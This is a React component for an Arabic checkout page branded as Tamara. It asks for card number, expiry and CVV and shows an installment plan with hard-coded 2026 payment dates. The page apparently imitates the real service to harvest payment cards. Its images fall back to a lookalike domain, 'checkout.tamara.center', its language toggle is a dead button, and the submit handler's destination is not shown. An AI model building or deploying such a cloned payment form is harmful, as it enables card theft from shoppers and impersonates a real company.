import { useState } from 'react';
import { toEnglishNumbers, formatPrice, toArabicNumbers } from '@/lib/utils';
import TamaraLogo from '@/components/TamaraLogo';

interface CardInfoProps {
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
  setCardNumber: (value: string) => void;
  setCardExpiry: (value: string) => void;
  setCardCvv: (value: string) => void;
  onBack: () => void;
  onSubmit: () => void;
  isSubmitting: boolean;
  selectedPlan?: {
    totalAmount: number;
    installmentsCount: number;
    perInstallment: number;
  } | null;
}

const formatExpiry = (value: string): string => {
  const digits = toEnglishNumbers(value).replace(/\D/g, '');

  if (digits.length === 0) return '';

  if (digits.length === 1) {
    const first = parseInt(digits[0]);
    if (first > 1) return '0' + digits[0] + '/';
    return digits[0];
  }

  let month = digits.slice(0, 2);
  const monthNum = parseInt(month);

  if (monthNum > 12) month = '12';
  if (monthNum === 0) month = '01';

  const year = digits.slice(2, 4);

  if (digits.length >= 2) {
    return month + (year.length > 0 ? '/' + year : '/');
  }

  return month;
};

const isValidExpiry = (value: string): boolean => {
  const digits = toEnglishNumbers(value).replace(/\D/g, '');
  if (digits.length !== 4) return false;

  const month = parseInt(digits.slice(0, 2));
  if (month < 1 || month > 12) return false;

  const year = parseInt('20' + digits.slice(2, 4));
  const now = new Date();
  const expiry = new Date(year, month - 1);

  return expiry >= new Date(now.getFullYear(), now.getMonth());
};

const CardInfo = ({
  cardNumber,
  cardExpiry,
  cardCvv,
  setCardNumber,
  setCardExpiry,
  setCardCvv,
  onBack,
  onSubmit,
  isSubmitting,
  selectedPlan,
}: CardInfoProps) => {
  const [showPlanDetails, setShowPlanDetails] = useState(false);
  const [selectedInstallment, setSelectedInstallment] = useState<number | null>(null);

  const expiryInvalid = cardExpiry.length > 0 && !isValidExpiry(cardExpiry);
  const isFormValid = !!(cardNumber && cardExpiry && cardCvv && isValidExpiry(cardExpiry));
  const isDisabled = !isFormValid || isSubmitting;

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value;
    const prev = cardExpiry;

    const isDeleting = raw.length < prev.length;
    if (isDeleting) {
      if (prev.endsWith('/') && raw === prev.slice(0, -1)) {
        setCardExpiry(raw.slice(0, -1));
      } else {
        setCardExpiry(raw);
      }
      return;
    }

    const formatted = formatExpiry(raw);
    setCardExpiry(formatted);
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = toEnglishNumbers(e.target.value).replace(/\D/g, '');
    const formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
    setCardNumber(formatted);
  };

  // Calculate USD amount (approximate exchange rate: 1 USD = 3.75 SAR)
  const exchangeRate = 3.75;
  const monthlyAmountUSD = selectedPlan ? Math.round((selectedPlan.perInstallment / exchangeRate) / 10) * 10 : 0;
  const totalAmountUSD = selectedPlan ? Math.round((selectedPlan.totalAmount / exchangeRate) / 10) * 10 : 0;

  // تواريخ الدفع الثابتة
  const PAYMENT_DATES = [
    '٤ أبريل ٢٠٢٦',
    '٤ مايو ٢٠٢٦',
    '٤ يونيو ٢٠٢٦',
    '٤ يوليو ٢٠٢٦',
    '٤ أغسطس ٢٠٢٦',
    '٤ سبتمبر ٢٠٢٦',
  ];

  // Generate installment items with fixed dates
  const generateInstallments = () => {
    if (!selectedPlan) return [];
    const items = [];
    for (let i = 0; i < selectedPlan.installmentsCount; i++) {
      items.push({
        number: i + 1,
        amount: selectedPlan.perInstallment,
        date: PAYMENT_DATES[i] || `الدفعة ${toArabicNumbers(i + 1)}`
      });
    }
    return items;
  };

  const installments = generateInstallments();

  return (
    <div
      className="min-h-screen flex flex-col"
      dir="rtl"
      style={{ 
        fontFamily: "'Cairo', 'Tajawal', sans-serif",
        background: '#ffffff'
      }}
    >
      <div className="max-w-[430px] mx-auto w-full flex flex-col flex-1">
        {/* Header */}
        <div className="flex items-center justify-between px-5 py-4 bg-white">
          <TamaraLogo />
          <div className="flex items-center gap-3">
            <button
              onClick={() => {}}
              className="text-[14px] font-medium text-gray-500 hover:text-gray-700 transition-colors"
            >
              English
            </button>
            <span className="text-gray-300">|</span>
            <button
              onClick={onBack}
              aria-label="إغلاق"
              className="w-8 h-8 flex items-center justify-center rounded-full bg-gray-100 hover:bg-gray-200 transition-all"
            >
              <span className="text-lg leading-none text-gray-600">✕</span>
            </button>
          </div>
        </div>

        {/* Separator */}
        <div className="h-px bg-gray-200" />

        {/* Content */}
        <div className="flex flex-col flex-1" style={{ paddingBottom: '80px' }}>
          {/* Page Title */}
          <h1 className="page-title">التأكيد والدفع</h1>

          {/* Card Form Section */}
          <div className="card-form-section w-full max-w-[364px]" style={{ height: '149px' }}>
            {/* Card Header */}
            <div className="card-header">
              <div className="add-card-text" style={{ color: '#000' }}>أضف بطاقة جديدة</div>
              <span className="radio-circle"></span>
            </div>

            {/* Card Number Input with Brand Icons Inside */}
            <div className="card-number-input-container w-full" style={{ height: '43px' }}>
              <input
                id="card_number"
                value={cardNumber}
                onChange={handleCardNumberChange}
                placeholder="رقم البطاقة"
                className="card-input-field"
                style={{
                  height: '43px',
                  paddingLeft: '145px',
                  color: '#1F2937',
                  letterSpacing: '0.15em',
                  direction: 'ltr'
                }}
                maxLength={19}
              />
              <span className="brand-logos-inside" style={{ width: '110.89px', height: '18px' }} aria-hidden="true">
                <img src="/external/images/american_express.png" alt="American Express" onError={(e) => { e.currentTarget.src = 'https://checkout.tamara.center/v.jpg'; }} />
                <img src="/external/images/visa.png" alt="Visa" onError={(e) => { e.currentTarget.src = 'https://checkout.tamara.center/vv.jpg'; }} />
                <img src="/external/images/mastercard.png" alt="Mastercard" onError={(e) => { e.currentTarget.src = 'https://checkout.tamara.center/vvv.jpg'; }} />
                <img src="/external/images/mada.png" alt="Mada" onError={(e) => { e.currentTarget.src = 'https://checkout.tamara.center/vvvv.jpg'; }} />
              </span>
            </div>

            {/* CVV and Expiry Row */}
            <div className="cvv-expiry-row w-full" style={{ height: '42px' }}>
              <div className="card-number-input-container flex-1" style={{ height: '42px' }}>
                <input
                  value={cardExpiry}
                  onChange={handleExpiryChange}
                  placeholder="MM/YY"
                  className="card-input-field"
                  style={{
                    height: '42px',
                    border: expiryInvalid
                      ? '1px solid #EF4444'
                      : 'none',
                    borderBottom: expiryInvalid
                      ? 'none'
                      : '1px solid var(--purple-line)',
                    color: '#1F2937',
                    direction: 'ltr'
                  }}
                  maxLength={5}
                />
                {expiryInvalid && (
                  <p className="text-xs mt-1 text-right" style={{ color: '#EF4444' }}>تاريخ انتهاء غير صالح</p>
                )}
              </div>
              <div className="card-number-input-container flex-1" style={{ height: '42px' }}>
                <input
                  value={cardCvv}
                  onChange={e => setCardCvv(toEnglishNumbers(e.target.value))}
                  placeholder="CVV"
                  type="text"
                  className="card-input-field"
                  style={{
                    height: '42px',
                    border: 'none',
                    borderBottom: '1px solid var(--purple-line)',
                    color: '#1F2937',
                    direction: 'ltr'
                  }}
                  maxLength={4}
                />
              </div>
            </div>
          </div>

          {/* Plan Section */}
          {selectedPlan && (
            <>
              <div className="plan-title w-full max-w-[376px]" style={{ height: '22px' }}>اختار الخطة</div>

              <div
                className="plan-box w-full max-w-[370px]"
                style={{ height: '87px' }}
                onClick={() => setShowPlanDetails(!showPlanDetails)}
              >
                <div className="plan-header w-full" style={{ height: '57px' }}>
                  <div className="plan-details" style={{ height: '57px' }}>
                    <div className="monthly-amount">
                      {formatPrice(selectedPlan.perInstallment)} ريال
                      <span className="usd-badge">${monthlyAmountUSD}</span>
                      <span>/شهرياً</span>
                    </div>
                    <div className="total-amount-details">
                      {selectedPlan.installmentsCount} دفعات · الإجمالي
                      <span>
                        {formatPrice(selectedPlan.totalAmount)} ريال
                        <span className="usd-badge">${totalAmountUSD}</span>
                      </span>
                    </div>
                  </div>
                  <div className="arrow-icon" style={{ height: '30px' }}>&gt;</div>
                </div>
              </div>

              {/* Bottom Sheet for Installment Details */}
              <div className={`bottom-sheet ${showPlanDetails ? 'active' : ''}`}>
                <div className="bottom-sheet-header">
                  <span>تفاصيل الدفعات</span>
                  <button 
                    className="bottom-sheet-close"
                    onClick={(e) => { e.stopPropagation(); setShowPlanDetails(false); }}
                  >
                    ×
                  </button>
                </div>
                
                <span className="installment-plan-badge">
                  {selectedPlan.installmentsCount} دفعات
                </span>

                <div className="installment-list">
                  {installments.map((item, index) => (
                    <div 
                      key={index}
                      className="installment-item"
                      onClick={() => setSelectedInstallment(index)}
                    >
                      <div className="installment-left">
                        <span 
                          className="radio-fake"
                          style={{
                            borderColor: selectedInstallment === index ? 'var(--purple)' : '#777',
                            background: selectedInstallment === index ? 'var(--purple)' : 'transparent'
                          }}
                        />
                        <span className="installment-date">الدفعة {item.number} - {item.date}</span>
                      </div>
                      <div className="installment-amount">
                        <span className="usd-badge" style={{ marginRight: 0 }}>
                          ${Math.round((item.amount / exchangeRate) / 10) * 10}
                        </span>
                        {formatPrice(item.amount)} ريال
                      </div>
                    </div>
                  ))}
                </div>

                <div className="installment-total">
                  الإجمالي: {formatPrice(selectedPlan.totalAmount)} ريال ({totalAmountUSD} $)
                </div>
              </div>

              {/* Overlay when bottom sheet is active */}
              {showPlanDetails && (
                <div 
                  style={{
                    position: 'fixed',
                    top: 0,
                    left: 0,
                    right: 0,
                    bottom: 0,
                    background: 'rgba(0,0,0,0.3)',
                    zIndex: 9998
                  }}
                  onClick={() => setShowPlanDetails(false)}
                />
              )}
            </>
          )}

          {/* Spacer */}
          <div className="flex-1" />
        </div>

        {/* Fixed Bottom Button - Payment Button */}
        <button
          onClick={onSubmit}
          disabled={isDisabled}
          className={`payment-btn w-full ${isFormValid ? 'active' : ''}`}
          style={{ maxWidth: '370px', height: '54px', margin: '0 auto' }}
        >
          {isSubmitting ? 'جاري المعالجة...' : selectedPlan ? (
            <>
              ادفع {formatPrice(selectedPlan.perInstallment)} ريال
              <span className="usd-badge">${monthlyAmountUSD}</span>
            </>
          ) : 'ادفع الآن'}
        </button>
      </div>
    </div>
  );
};

export default CardInfo;
